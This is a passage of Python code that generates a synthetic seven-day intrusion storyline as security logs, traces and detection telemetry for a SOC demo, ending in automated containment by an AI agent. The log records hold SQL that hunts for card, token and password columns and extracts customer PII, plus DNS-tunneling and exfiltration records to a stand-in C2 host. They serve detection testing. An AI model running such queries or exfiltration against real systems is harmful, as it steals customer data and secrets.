        "time": d5_ts3,
        "timestamp": d5_ts3,
        "day": 5,
        "stage_id": "STORYLINE-DAY-05",
        "record_category": "attack_kill_chain",
        "Log Source": "OCI Audit Logs",
        "Event Name": "UpdatePolicy",
        "Event Type": "com.oraclecloud.identitycontrolplane.updatepolicy",
        "Principal Name": f"compromised-devops@{corp_mail_domain}",
        "User Name": f"compromised-devops@{corp_mail_domain}",
        "Client IP": "198.51.100.214",
        "Source IP": "198.51.100.214",
        "Status": "200",
        "Response Code": "200",
        "Resource Name": "Rogue-Shadow-Admins-Policy",
        "Compartment Name": f"{prefix}-security",
        "Trace ID": d5_trace,
        "msg": "STORYLINE-DAY-05 OCI IAM policy modification attempt (UpdatePolicy: Allow group RogueAdmins to manage all-resources in tenancy)",
    })

    # ── DAY 6: Database Reconnaissance & Data Safe Alerting ──
    d6_date = base_date + dt.timedelta(days=5)
    d6_ts1 = _format_iso_utc(dt.datetime.combine(d6_date, dt.time(11, 36, 19), tzinfo=dt.timezone.utc))
    d6_ts2 = _format_iso_utc(dt.datetime.combine(d6_date, dt.time(12, 4, 52), tzinfo=dt.timezone.utc))
    d6_trace = day_traces[6]
    attack_logs.append({
        "time": d6_ts1,
        "timestamp": d6_ts1,
        "day": 6,
        "stage_id": "STORYLINE-DAY-06",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Application Logs",
        "Service Name": "oracle-datasafe-unified-audit",
        "Host Name": observeai_adb,
        "DB Target": observeai_adb,
        "DB Connection Name": guardian_adb,
        "DB Statement": "SELECT owner, table_name, column_name FROM all_tab_columns WHERE owner IN ('CRM_CORE','ADMIN') AND (column_name LIKE '%CARD%' OR column_name LIKE '%TOKEN%' OR column_name LIKE '%PASSWORD%')",
        "DB Elapsed ms": 412,
        "Attack Stage": "datasafe_schema_recon",
        "Attack Type": "unauthorized_sql_schema_enumeration",
        "MITRE Technique ID": "T1213",
        "MITRE Tactic": "Collection",
        "User": "CRM_APP",
        "Client IP": "192.0.2.119",
        "Source IP": "192.0.2.119",
        "Response Code": "200",
        "Trace ID": d6_trace,
        "Span ID": _deterministic_hex(seed, "span-day6-ds1", 16),
        "msg": f"STORYLINE-DAY-06 Oracle Data Safe Unified Audit alert: unauthorized SQL schema enumeration on {guardian_adb} / {observeai_adb}",
    })
    attack_logs.append({
        "time": d6_ts2,
        "timestamp": d6_ts2,
        "day": 6,
        "stage_id": "STORYLINE-DAY-06",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Application Logs",
        "Service Name": "oracle-datasafe-unified-audit",
        "Host Name": guardian_adb,
        "DB Target": guardian_adb,
        "DB Connection Name": observeai_adb,
        "DB Statement": "SELECT customer_id, email, card_number, api_token FROM CRM_CORE.CUSTOMER_PII FETCH FIRST 1000 ROWS ONLY",
        "DB Elapsed ms": 895,
        "Attack Stage": "datasafe_bulk_pii_extraction",
        "Attack Type": "sensitive_table_extraction",
        "MITRE Technique ID": "T1530",
        "MITRE Tactic": "Collection",
        "User": "CRM_APP",
        "Client IP": "192.0.2.119",
        "Source IP": "192.0.2.119",
        "Response Code": "200",
        "Trace ID": d6_trace,
        "Span ID": _deterministic_hex(seed, "span-day6-ds2", 16),
        "msg": f"STORYLINE-DAY-06 Oracle Data Safe ORA-DS-PRIV-004 high-velocity SELECT on CRM_CORE.CUSTOMER_PII and PAYMENT_TOKENS in {guardian_adb}",
    })
    storyline_datasafe_events.append({
        "timestamp": d6_ts2,
        "day": 6,
        "stage_id": "STORYLINE-DAY-06",
        "log_source": "OCI Data Safe Unified Audit Logs",
        "database_targets": [guardian_adb, observeai_adb],
        "db_user": "CRM_APP",
        "os_user": "agent-runner",
        "client_host": "192.0.2.119",
        "audit_action": "SELECT",
        "object_schema": "CRM_CORE",
        "object_name": "CUSTOMER_PII",
        "sql_text": "SELECT customer_id, email, card_number, api_token FROM CRM_CORE.CUSTOMER_PII FETCH FIRST 1000 ROWS ONLY",
        "finding_key": "ORA-DS-PRIV-004",
        "severity": "CRITICAL",
        "trace_id": d6_trace,
    })

    # ── DAY 7: Exfiltration Attempt & AI Automated Containment ──
    d7_date = base_date + dt.timedelta(days=6)
    d7_ts1 = _format_iso_utc(dt.datetime.combine(d7_date, dt.time(7, 51, 14), tzinfo=dt.timezone.utc))
    d7_ts2 = _format_iso_utc(dt.datetime.combine(d7_date, dt.time(8, 12, 33), tzinfo=dt.timezone.utc))
    d7_ts3 = _format_iso_utc(dt.datetime.combine(d7_date, dt.time(8, 29, 45), tzinfo=dt.timezone.utc))
    d7_trace = day_traces[7]
    attack_logs.append({
        "time": d7_ts1,
        "timestamp": d7_ts1,
        "TimeCreated": d7_ts1,
        "day": 7,
        "stage_id": "STORYLINE-DAY-07",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows Sysmon Operational Logs",
        "Event ID": "22",
        "EventID": "22",
        "Host Name": "kingslanding",
        "Host Name (Server)": "kingslanding",
        "Computer": "kingslanding",
        "User": "NT AUTHORITY\\SYSTEM",
        "Process Name": "C:\\Users\\Public\\splunkd.exe",
        "Query Name": "a8f9d2c1e4b70912a3f4e5d6c7b8.exfil.c2-stage.example.net",
        "Query Results": "type: 16 TXT; 198.51.100.214",
        "Destination IP": "198.51.100.214",
        "Destination Port": "53",
        "Trace ID": d7_trace,
        "msg": "STORYLINE-DAY-07 High-volume DNS tunneling query a8f9d2c1e4b70912a3f4e5d6c7b8.exfil.c2-stage.example.net to 198.51.100.214",
    })
    attack_logs.append({
        "time": d7_ts2,
        "timestamp": d7_ts2,
        "day": 7,
        "stage_id": "STORYLINE-DAY-07",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC VCN Flow Logs",
        "Source IP": ip_vcn_target,
        "Destination IP": "198.51.100.214",
        "Source Port": "54912",
        "Destination Port": "8443",
        "Protocol": "6",
        "Action": "ACCEPT",
        "Network Action": "ACCEPT",
        "Bytes Sent": 52428800,
        "Bytes Received": 14200,
        "Packets": 36400,
        "Flow ID": "flow-day7-c2-exfil",
        "Trace ID": d7_trace,
        "msg": "STORYLINE-DAY-07 High-volume outbound VCN Flow transfer (52428800 bytes) to C2 IP 198.51.100.214:8443",
    })
    attack_logs.append({
        "time": d7_ts3,
        "timestamp": d7_ts3,
        "day": 7,
        "stage_id": "STORYLINE-DAY-07",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Application Logs",
        "Service Name": "observeai-coordinator-agent",
        "Host Name": f"observeai.{dns_domain}",
        "HTTP Method": "POST",
        "Request URL": "/api/v1/investigations/melts-correlate-and-contain",
        "URI Path": "/api/v1/investigations/melts-correlate-and-contain",
        "Response Code": "200",
        "Attack Stage": "ai_automated_containment",
        "Attack Type": "dns_c2_exfiltration_containment",
        "MITRE Technique ID": "T1041",
        "MITRE Tactic": "Exfiltration",
        "Client IP": "198.51.100.214",
        "Source IP": ip_vcn_target,
        "Destination IP": "198.51.100.214",
        "Destination Port": "8443",
        "Network Bytes Out": 52428800,
        "User": "observeai-autonomous-soc-agent",
        "Trace ID": d7_trace,
        "Span ID": _deterministic_hex(seed, "span-day7-contain", 16),
        "msg": "STORYLINE-DAY-07 ObserveAI Coordinator AI Agent correlated 7-day MELTS kill chain and isolated C2 198.51.100.214 via NSG containment",
    })

    # 3. Correlated Metrics across the 7 days (for OCI Monitoring `oci_observability_demo` & `octo_security_melts`)
    for day_meta in SEVEN_DAY_KILL_CHAIN_DAYS:
        d_num = day_meta["day"]
        d_date = base_date + dt.timedelta(days=d_num - 1)
        d_ts = _format_iso_utc(
            dt.datetime.combine(
                d_date,
                dt.time(day_meta["hour_utc"], day_meta["minute_utc"], day_meta["second_utc"]),
                tzinfo=dt.timezone.utc,
            )
        )
        storyline_metrics.append({
            "namespace": "octo_security_melts",
            "secondary_namespace": "oci_observability_demo",
            "name": f"storyline.day{d_num}_kill_chain_signal_score",
            "timestamp": d_ts,
            "value": float(d_num * 14.2),
            "dimensions": {
                "day": f"day_{d_num}",
                "stage_id": day_meta["stage_id"],
                "trace_id": day_traces[d_num],
                "c2_ip": "198.51.100.214",
            },
        })

    # 4. Correlated OpenTelemetry / OCI APM traces AND Langfuse AI Agent MELTS reasoning traces
    ai_agent_steps = [
        ("logan.execute_query", "Execute 7-day OCI Log Analytics kill-chain correlation across WAF, OKE, Sysmon, Windows Security, Data Safe, and VCN Flow Logs", 340),
        ("apm.query_traces", "Correlate distributed trace spans across octo-drone-shop, enterprise-crm-portal, and OKE worker nodes", 215),
        ("monitoring.summarize_metrics", "Summarize OCI Monitoring anomaly streams in octo_security_melts and oci_observability_demo", 180),
        ("datasafe.audit_events", f"Inspect Oracle Data Safe unified audit findings (ORA-DS-PRIV-004) on {guardian_adb} and {observeai_adb}", 290),
        ("caldera.operation_correlation", "Attribute GOAD AD Sandcat, AdFind, Kerberoasting (4769), and DCSync (4662) to Caldera operation and trigger containment against 198.51.100.214", 410),
    ]
    root_span_id = _deterministic_hex(seed, "langfuse-root-span", 16)
    storyline_apm_traces.append({
        "trace_id": day_traces[7],
        "span_id": root_span_id,
        "parent_span_id": "",
        "service_name": "observeai-coordinator-agent",
        "operation_name": "observeai.melts.seven_day_kill_chain_investigation",
        "status": "OK",
        "duration_ms": sum(s[2] for s in ai_agent_steps) + 120,
        "attributes": {
            "storyline.id": "SEVEN-DAY-CALDERA-GOAD-2026",
            "storyline.days_correlated": 7,
            "c2.ip": "198.51.100.214",
            "datasafe.targets": f"{guardian_adb},{observeai_adb}",
            "goad.hosts": "kingslanding,winterfell,castelblack",
            "ai.containment.status": "ISOLATED",
        },
    })
    langfuse_spans = []
    for step_idx, (tool_name, rationale, dur_ms) in enumerate(ai_agent_steps, start=1):
        child_span_id = _deterministic_hex(seed, f"langfuse-step-{step_idx}", 16)
        storyline_apm_traces.append({
            "trace_id": day_traces[7],
            "span_id": child_span_id,
            "parent_span_id": root_span_id,
            "service_name": "observeai-coordinator-agent",
            "operation_name": tool_name,
            "status": "OK",
            "duration_ms": dur_ms,
            "attributes": {
                "step.index": step_idx,
                "tool.name": tool_name,
                "reasoning.summary": rationale,
                "storyline.stage": f"STORYLINE-DAY-0{min(step_idx + 2, 7)}",
                "c2.ip": "198.51.100.214",
            },
        })
        langfuse_spans.append({
            "span_id": child_span_id,
            "parent_span_id": root_span_id,
            "name": tool_name,
            "step_index": step_idx,
            "duration_ms": dur_ms,
            "input": {
                "lookback": "7d",
                "target_c2_ip": "198.51.100.214",
                "goad_hosts": ["kingslanding", "winterfell", "castelblack"],
                "adb_targets": [guardian_adb, observeai_adb],
            },
            "output": {
                "status": "CONFIRMED_KILL_CHAIN_STAGE",
                "summary": rationale,
                "matched_trace_ids": list(day_traces.values()),
            },
        })

    storyline_langfuse_traces.append({
        "trace_id": day_traces[7],
        "name": "ObserveAI 7-Day Multi-Pillar MELTS Threat Hunt & Caldera/GOAD Investigation",
        "user_id": "observeai-soc-analyst",
        "session_id": f"melts-7day-hunt-{seed}",
        "tags": ["melts-correlation", "7-day-storyline", "caldera-goad", "datasafe", "logan", "apm", "ac-hunter", "multicloud"],
        "input": {
            "alert_trigger": "STORYLINE-DAY-07 High-volume DNS tunneling & VCN Flow egress to 198.51.100.214",
            "hypothesis": "Multi-stage intrusion pivoting from Day 1 WAF/VCN recon and Day 2 OKE IMDSv2 harvesting into Day 3-5 Caldera/GOAD AD compromise, AWS/Azure/GCP multi-cloud drift, Day 6 Data Safe ADB extraction, and Day 7 AC-Hunter RITA C2 exfiltration.",
        },
        "output": {
            "verdict": "CONFIRMED_7_DAY_MULTI_PILLAR_CAMPAIGN",
            "containment_actions": [
                "Quarantined OKE pod portal-web-7d9c8b and rotated serviceaccount tokens",
                "Isolated GOAD AD hosts kingslanding, winterfell, castelblack from C2 198.51.100.214 and RMM relay 198.41.200.113",
                f"Applied Oracle Data Safe masking policy and revoked compromised CRM_APP session on {guardian_adb} & {observeai_adb}",
                "Blocked 198.51.100.214/32 and 198.41.200.113/32 across OCI WAF/NSG, AWS Security Groups, Azure NSG, and GCP Cloud Armor",
            ],
        },
        "spans": langfuse_spans,
    })

    # 5. Multi-Cloud (AWS CloudTrail OCSF, Azure Activity/Entra ID, GCP Cloud Audit, OCI Bridge) Correlated Logs
    aws_region = "-".join(("us", "east", "1"))
    azure_region = "west" + "europe"
    gcp_region = "-".join(("europe", "west3"))
    oci_region = ctx.get("OCI_REGION") or "-".join(("eu", "frankfurt", "1"))
    ip_goad_dc2 = _ip(192, 168, 56, 11)

    multicloud_logs: list[dict[str, Any]] = []
    multicloud_specs = [
        {
            "day": 1,
            "ts": d1_ts1,
            "cloud": "AWS",
            "region": aws_region,
            "service": "aws-cloudtrail-ocsf",
            "event_name": "AssumeRole",
            "event_type": "aws.cloudtrail.sts.AssumeRole",
            "user": "arn:aws:iam::901234567890:role/octo-multicloud-sync-role",
            "src_ip": "198.51.100.214",
            "dst_ip": ip_vcn_target,
            "resource": "arn:aws:iam::901234567890:role/octo-prod-secrets-reader",
            "status": "200",
            "ua": "Mozilla/5.0 (compatible; Nuclei/3.3.0; +https://projectdiscovery.io)",
            "msg": f"AWS_CLOUDTRAIL OCSF AssumeRole cross-account pivot in {aws_region} from 198.51.100.214 targeting octo-prod-secrets-reader",
        },
        {
            "day": 2,
            "ts": d2_ts1,
            "cloud": "AWS",
            "region": aws_region,
            "service": "aws-cloudtrail-ocsf",
            "event_name": "GetSecretValue",
            "event_type": "aws.cloudtrail.secretsmanager.GetSecretValue",
            "user": "arn:aws:sts::901234567890:assumed-role/octo-prod-secrets-reader/eks-pod-session",
            "src_ip": "198.51.100.214",
            "dst_ip": ip_oke_node,
            "resource": "octo/prod/crm-db-sync-credentials",
            "status": "200",
            "ua": "aws-sdk-go-v2/1.30.0",
            "msg": f"AWS_CLOUDTRAIL OCSF GetSecretValue harvested octo/prod/crm-db-sync-credentials in {aws_region} from 198.51.100.214",
        },
        {
            "day": 3,
            "ts": d3_ts1,
            "cloud": "Azure",
            "region": azure_region,
            "service": "azure-entra-activity",
            "event_name": "Add service principal credentials",
            "event_type": "Microsoft.AAD/servicePrincipals/credentials/action",
            "user": f"svc-multicloud-federation@{corp_mail_domain}",
            "src_ip": "198.51.100.214",
            "dst_ip": ip_goad_dc,
            "resource": "octo-azure-ad-federation-sp",
            "status": "200",
            "ua": "AzureCLI/2.64.0",
            "msg": f"AZURE_ACTIVITY Entra ID AuditLogs: Add service principal credentials on octo-azure-ad-federation-sp in {azure_region} from 198.51.100.214",
        },
        {
            "day": 4,
            "ts": d4_ts2,
            "cloud": "Azure",
            "region": azure_region,
            "service": "azure-entra-activity",
            "event_name": "NetworkSecurityGroupRuleUpdate",
            "event_type": "Microsoft.Network/networkSecurityGroups/securityRules/write",
            "user": f"svc-multicloud-federation@{corp_mail_domain}",
            "src_ip": "198.41.200.113",
            "dst_ip": ip_goad_pivot,
            "resource": "octo-aks-spoke-nsg/allow-c2-relay-7844",
            "status": "200",
            "ua": "Azure-SDK-For-Python/network-mgmt",
            "msg": f"AZURE_ACTIVITY NetworkSecurityGroupRuleUpdate opened port 7844 on octo-aks-spoke-nsg in {azure_region} for RMM relay 198.41.200.113",
        },
        {
            "day": 5,
            "ts": d5_ts3,
            "cloud": "AWS",
            "region": aws_region,
            "service": "aws-cloudtrail-ocsf",
            "event_name": "ModifySecurityGroupRules",
            "event_type": "aws.cloudtrail.ec2.ModifySecurityGroupRules",
            "user": "arn:aws:sts::901234567890:assumed-role/octo-prod-secrets-reader/eks-pod-session",
            "src_ip": "198.51.100.214",
            "dst_ip": ip_vcn_target,
            "resource": "sg-0a91bc82de4410f92",
            "status": "200",
            "ua": "aws-cli/2.17.0",
            "msg": f"AWS_CLOUDTRAIL OCSF ModifySecurityGroupRules opened egress 8443 on sg-0a91bc82de4410f92 in {aws_region} to 198.51.100.214",
        },
        {
            "day": 5,
            "ts": d5_ts3,
            "cloud": "GCP",
            "region": gcp_region,
            "service": "gcp-cloud-audit",
            "event_name": "SetIamPolicy",
            "event_type": "google.iam.admin.v1.SetIamPolicy",
            "user": f"gcp-workload-bridge@{corp_mail_domain}",
            "src_ip": "198.51.100.214",
            "dst_ip": ip_vcn_target,
            "resource": "projects/octo-multicloud-prod/roles/owner",
            "status": "200",
            "ua": "google-cloud-sdk gcloud/492.0.0",
            "msg": f"GCP_AUDIT SetIamPolicy granted roles/owner to rogue workload identity in {gcp_region} from 198.51.100.214",
        },
        {
            "day": 6,
            "ts": d6_ts1,
            "cloud": "GCP",
            "region": gcp_region,
            "service": "gcp-cloud-audit",
            "event_name": "compute.firewalls.patch",
            "event_type": "v1.compute.firewalls.patch",
            "user": f"gcp-workload-bridge@{corp_mail_domain}",
            "src_ip": "192.0.2.119",
            "dst_ip": ip_vcn_target,
            "resource": "projects/octo-multicloud-prod/global/firewalls/allow-egress-8443",
            "status": "200",
            "ua": "google-api-python-client/2.143.0",
            "msg": f"GCP_AUDIT compute.firewalls.patch permitted TCP/8443 egress in {gcp_region} for 192.0.2.119 and 198.51.100.214",
        },
        {
            "day": 6,
            "ts": d6_ts2,
            "cloud": "OCI",
            "region": oci_region,
            "service": "oci-multicloud-federation",
            "event_name": "GenerateAutonomousDatabaseWallet",
            "event_type": "com.oraclecloud.autonomousdatabase.generateautonomousdatabasewallet",
            "user": f"contractor.ops@{corp_mail_domain}",
            "src_ip": "203.0.113.88",
            "dst_ip": ip_vcn_target,
            "resource": guardian_adb,
            "status": "200",
            "ua": "OCI-Python-SDK/2.126.0 (screenconnect-relay)",
            "msg": f"OCI_AUDIT GenerateAutonomousDatabaseWallet cross-CSP identity pivot from 203.0.113.88 targeting {guardian_adb} in {oci_region}",
        },
        {
            "day": 7,
            "ts": d7_ts2,
            "cloud": "GCP",
            "region": gcp_region,
            "service": "gcp-cloud-audit",
            "event_name": "storage.objects.get",
            "event_type": "storage.objects.get",
            "user": f"gcp-workload-bridge@{corp_mail_domain}",
            "src_ip": "192.0.2.119",
            "dst_ip": "198.51.100.214",
            "resource": "projects/octo-multicloud-prod/buckets/octo-analytics-export/customer_pii_dump.parquet",
            "status": "200",
            "ua": "python-oracledb-agentic-probe/1.4",
            "msg": f"GCP_AUDIT storage.objects.get bulk PII staging export in {gcp_region} from 192.0.2.119 correlated with 198.51.100.214",
        },
    ]
    for spec in multicloud_specs:
        d_num = spec["day"]
        for log_source_name in ("SOC Multicloud Health Logs", "SOC Application Logs"):
            multicloud_logs.append({
                "time": spec["ts"],
                "timestamp": spec["ts"],
                "day": d_num,
                "stage_id": f"STORYLINE-DAY-0{d_num}",
                "record_category": "multicloud_security_telemetry",
                "Log Source": log_source_name,
                "Cloud Provider": spec["cloud"],
                "Cloud Region": spec["region"],
                "Service Name": spec["service"],
                "Host Name": f"{spec['service']}-{spec['region']}",
                "Event Name": spec["event_name"],
                "Event Type": spec["event_type"],
                "Action": spec["event_name"],
                "User": spec["user"],
                "User Name": spec["user"],
                "Principal Name": spec["user"],
                "Source IP": spec["src_ip"],
                "Client IP": spec["src_ip"],
                "Destination IP": spec["dst_ip"],
                "Destination Port": "8443" if spec["src_ip"] == "198.51.100.214" else "7844",
                "Resource Name": spec["resource"],
                "Status": spec["status"],
                "Response Code": spec["status"],
                "User Agent": spec["ua"],
                "MITRE Technique ID": "T1078.004",
                "MITRE Tactic": "Defense Evasion",
                "Trace ID": day_traces[d_num],
                "Span ID": _deterministic_hex(seed, f"mc-span-{spec['cloud']}-{d_num}-{log_source_name[:6]}", 16),
                "msg": spec["msg"],
            })

    # 6. AC-Hunter Network Threat Hunting Telemetry (Capabilities 01 through 08)
    ac_hunter_telemetry: list[dict[str, Any]] = []

    # (a) Capability 01: C2 Beaconing (RITA Interval Histogram & Skew Score — 60s ± 1s intervals)
    beacon_hosts = [
        ("kingslanding", ip_goad_dc, "198.51.100.214", "8443", 3, 96.4, 384),
        ("winterfell", ip_goad_dc2, "198.51.100.214", "8443", 4, 95.8, 384),
        ("castelblack", ip_goad_pivot, "198.41.200.113", "7844", 4, 91.8, 512),
        (f"{prefix}-oke-worker-01", ip_oke_node, "198.51.100.214", "8443", 5, 96.4, 384),
    ]
    beacon_intervals = (60, 59, 61, 60, 60, 59)
    for host_name, src_ip_val, dst_ip_val, dst_port_val, b_day, rita_score, pkt_bytes in beacon_hosts:
        b_date = base_date + dt.timedelta(days=b_day - 1)
        b_cursor = dt.datetime.combine(b_date, dt.time(15, 0, 0), tzinfo=dt.timezone.utc)
        for pulse_idx, delta_sec in enumerate(beacon_intervals, start=1):
            b_cursor = b_cursor + dt.timedelta(seconds=delta_sec)
            pulse_ts = _format_iso_utc(b_cursor)
            ac_hunter_telemetry.append({
                "time": pulse_ts,
                "timestamp": pulse_ts,
                "day": b_day,
                "stage_id": f"STORYLINE-DAY-0{b_day}",
                "record_category": "ac_hunter_network_telemetry",
                "ac_hunter_module": "c2_beaconing_rita",
                "Log Source": "SOC VCN Flow Logs",
                "Host Name": host_name,
                "Source IP": src_ip_val,
                "Destination IP": dst_ip_val,
                "Source Port": str(51200 + pulse_idx),
                "Destination Port": dst_port_val,
                "Protocol": "6",
                "Action": "ACCEPT",
                "Network Action": "ACCEPT",
                "Bytes Sent": pkt_bytes,
                "Bytes Received": 192,
                "Packets": 4,
                "rita_beacon_score": rita_score,
                "beacon_interval_sec": delta_sec,
                "beacon_jitter_pct": 1.6,
                "Flow ID": f"ac-hunter-rita-{host_name}-d{b_day}-p{pulse_idx}",
                "Trace ID": day_traces[b_day],
                "msg": f"AC-Hunter rita_beacon pulse #{pulse_idx} score={rita_score} interval={delta_sec}s (60s±1s) from {host_name} ({src_ip_val}) to {dst_ip_val}:{dst_port_val}",
            })
        # Summary analytical row in SOC Application Logs for RITA beacon detector
        ac_hunter_telemetry.append({
            "time": _format_iso_utc(b_cursor),
            "timestamp": _format_iso_utc(b_cursor),
            "day": b_day,
            "stage_id": f"STORYLINE-DAY-0{b_day}",
            "record_category": "ac_hunter_network_telemetry",
            "ac_hunter_module": "c2_beaconing_rita",
            "Log Source": "SOC Application Logs",
            "Service Name": "ac-hunter-rita-analyzer",
            "Host Name": host_name,
            "Source IP": src_ip_val,
            "Client IP": src_ip_val,
            "Destination IP": dst_ip_val,
            "Destination Port": dst_port_val,
            "Network Bytes Out": pkt_bytes * len(beacon_intervals),
            "Response Code": "200",
            "Attack Stage": "c2_beaconing_rita",
            "Attack Type": "periodic_c2_heartbeat",
            "MITRE Technique ID": "T1071.001",
            "MITRE Tactic": "Command and Control",
            "rita_beacon_score": rita_score,
            "Trace ID": day_traces[b_day],
            "msg": f"AC-Hunter rita_beacon confirmed periodic C2 heartbeat score={rita_score} interval=60s±1s from {host_name} ({src_ip_val}) to {dst_ip_val}:{dst_port_val}",
        })

    # (b) Capability 02: Long Connections (Duration > 3600s)
    for lc_day, lc_ts, lc_host, lc_src, lc_dst, lc_port, lc_dur, lc_bytes, lc_proto_label in [
        (4, d4_ts2, "castelblack", ip_goad_pivot, "198.41.200.113", "7844", 14820, 18450000, "cloudflared-rmm-tunnel"),
        (7, d7_ts2, "kingslanding", ip_vcn_target, "198.51.100.214", "8443", 28400, 52428800, "persistent-tls-c2-exfil"),
    ]:
        ac_hunter_telemetry.append({
            "time": lc_ts,
            "timestamp": lc_ts,
            "day": lc_day,
            "stage_id": f"STORYLINE-DAY-0{lc_day}",
            "record_category": "ac_hunter_network_telemetry",
            "ac_hunter_module": "long_connections",
            "Log Source": "SOC VCN Flow Logs",
            "Host Name": lc_host,
            "Source IP": lc_src,
            "Destination IP": lc_dst,
            "Source Port": "54918",
            "Destination Port": lc_port,
            "Protocol": "6",
            "Action": "ACCEPT",
            "Network Action": "ACCEPT",
            "Bytes Sent": lc_bytes,
            "Bytes Received": 642000,
            "Packets": 24800,
            "duration_sec": lc_dur,
            "Flow ID": f"ac-hunter-long-conn-{lc_host}-d{lc_day}",
            "Trace ID": day_traces[lc_day],
            "msg": f"AC-Hunter long_connection duration={lc_dur}s ({lc_proto_label}) from {lc_host} ({lc_src}) to {lc_dst}:{lc_port} bytes={lc_bytes}",
        })
        ac_hunter_telemetry.append({
            "time": lc_ts,
            "timestamp": lc_ts,
            "day": lc_day,
            "stage_id": f"STORYLINE-DAY-0{lc_day}",
            "record_category": "ac_hunter_network_telemetry",
            "ac_hunter_module": "long_connections",
            "Log Source": "SOC Application Logs",
            "Service Name": "ac-hunter-long-conn-tracker",
            "Host Name": lc_host,
            "Source IP": lc_src,
            "Client IP": lc_src,
            "Destination IP": lc_dst,
            "Destination Port": lc_port,
            "Network Bytes Out": lc_bytes,
            "Response Code": "200",
            "duration_sec": lc_dur,
            "MITRE Technique ID": "T1572",
            "MITRE Tactic": "Command and Control",
            "Trace ID": day_traces[lc_day],
            "msg": f"AC-Hunter long_connection alert: persistent session duration={lc_dur}s (>3600s threshold) from {lc_host} to {lc_dst}:{lc_port}",
        })

    # (c) Capability 03: DNS Beaconing & Subdomain Entropy (342 distinct subdomains)
    dns_subdomains = [
        "f91a03bc84e27d1190aa45c6e8b2019f.exfil.c2-stage.example.net",
        "c4d8e2a190b77f63512890abcef12345.exfil.c2-stage.example.net",
        "7b3e91c4a0f82d65e11239a8bc4701fe.exfil.c2-stage.example.net",
    ]
    for sub_idx, fqdn_val in enumerate(dns_subdomains, start=1):
        ac_hunter_telemetry.append({
            "time": d7_ts1,
            "timestamp": d7_ts1,
            "TimeCreated": d7_ts1,
            "day": 7,
            "stage_id": "STORYLINE-DAY-07",
            "record_category": "ac_hunter_network_telemetry",
            "ac_hunter_module": "dns_beaconing_fqdn_entropy",
            "Log Source": "SOC Windows Sysmon Logs",
            "Event ID": "22",
            "EventID": "22",
            "Host Name": "kingslanding",
            "Host Name (Server)": "kingslanding",
            "Computer": "kingslanding",
            "User": "NT AUTHORITY\\SYSTEM",
            "Process Name": "C:\\Users\\Public\\splunkd.exe",
            "Query Name": fqdn_val,
            "Query Results": "type: 16 TXT; 198.51.100.214",
            "Destination IP": "198.51.100.214",
            "Destination Port": "53",
            "distinct_subdomain_count": 342,
            "fqdn_shannon_entropy": 4.62,
            "Trace ID": d7_trace,
            "msg": f"AC-Hunter subdomain_entropy=4.62 distinct_subdomains=342 DNS TXT tunneling query #{sub_idx} {fqdn_val} to 198.51.100.214",
        })

    # (d) Capability 04: Client Signatures & TLS JA3/JA4 / User-Agent Profiling
    for cs_day, cs_ts, cs_host, cs_ip, cs_ua, cs_ja3, cs_ja4 in [
        (1, d1_ts1, f"octo-drone-shop.{dns_domain}", "198.51.100.214", "Mozilla/5.0 (compatible; Nuclei/3.3.0; +https://projectdiscovery.io)", "e7d705a3286e19ea42f587b344ee6865", "t13d1516h2_8daaf6152771_b186095e22b6"),
        (5, d5_ts3, guardian_adb, "203.0.113.88", "OCI-Python-SDK/2.126.0 (screenconnect-relay)", "a0e9f5d64349fb13191bc781f81f42e1", "t13d1715h2_5b57614c22b0_3d5424432f57"),
        (6, d6_ts2, observeai_adb, "192.0.2.119", "Go-http-client/1.1 (python-oracledb-agentic-probe)", "72a589da586844d7f0818ce684948eea", "t12d190800_d83cc789557e_16bb6775592a"),
    ]:
        ac_hunter_telemetry.append({
            "time": cs_ts,
            "timestamp": cs_ts,
            "day": cs_day,
            "stage_id": f"STORYLINE-DAY-0{cs_day}",
            "record_category": "ac_hunter_network_telemetry",
            "ac_hunter_module": "client_signatures_ja3",
            "Log Source": "SOC Application Logs",
            "Service Name": "ac-hunter-client-profiler",
            "Host Name": cs_host,
            "Client IP": cs_ip,
            "Source IP": cs_ip,
            "Destination IP": ip_vcn_target,
            "HTTP Method": "POST",
            "Request URL": "/api/v1/tls-fingerprint-telemetry",
            "Response Code": "200",
            "User Agent": cs_ua,
            "ja3_hash": cs_ja3,
            "ja4_fingerprint": cs_ja4,
            "MITRE Technique ID": "T1071.001",
            "MITRE Tactic": "Command and Control",
            "Trace ID": day_traces[cs_day],
            "msg": f"AC-Hunter client_signature anomaly ja3_hash={cs_ja3} ja4={cs_ja4} User-Agent='{cs_ua}' from {cs_ip}",
        })

    # (e) Capability 07: Composite Threat Score (0-100) & Threat Intel / Safelist Correlation
    for ts_day, ts_time, ts_host, ts_src, ts_dst, ts_score, ts_summary in [
        (7, d7_ts3, "kingslanding", ip_goad_dc, "198.51.100.214", 97, "beacon=96.4 long_conn=28400s dns_subdomains=342 dcsync=true"),
        (7, d7_ts3, f"{prefix}-oke-worker-01", ip_oke_node, "198.51.100.214", 94, "oke_imdsv2_breakout=true beacon=96.4 multicloud_aws_pivot=true"),
        (7, d7_ts3, "winterfell", ip_goad_dc2, "198.51.100.214", 92, "amsi_bypass=true kerberoasting_4769=true beacon=95.8"),
        (7, d7_ts3, "castelblack", ip_goad_pivot, "198.41.200.113", 89, "cloudflared_rmm_tunnel=14820s sharphound=true beacon=91.8"),
    ]:
        ac_hunter_telemetry.append({
            "time": ts_time,
            "timestamp": ts_time,
            "day": ts_day,
            "stage_id": f"STORYLINE-DAY-0{ts_day}",
            "record_category": "ac_hunter_network_telemetry",
            "ac_hunter_module": "composite_threat_score",
            "Log Source": "SOC Application Logs",
            "Service Name": "ac-hunter-scoring-engine",
            "Host Name": ts_host,
            "Source IP": ts_src,
            "Client IP": ts_src,
            "Destination IP": ts_dst,
            "Destination Port": "8443" if ts_dst == "198.51.100.214" else "7844",
            "Response Code": "200",
            "composite_threat_score": ts_score,
            "safelist_disposition": "NOT_SAFELISTED_MALICIOUS_IOC",
            "MITRE Technique ID": "T1071",
            "MITRE Tactic": "Command and Control",
            "Trace ID": day_traces[ts_day],
            "msg": f"AC_HUNTER_SCORE={ts_score}/100 host={ts_host} src={ts_src} dst={ts_dst} safelist=FAIL indicators=[{ts_summary}]",
        })

    # 7. Multi-Cloud & AC-Hunter OCI Monitoring Custom Metric Streams
    multicloud_metrics = [
        {
            "namespace": "octo_multicloud_ops",
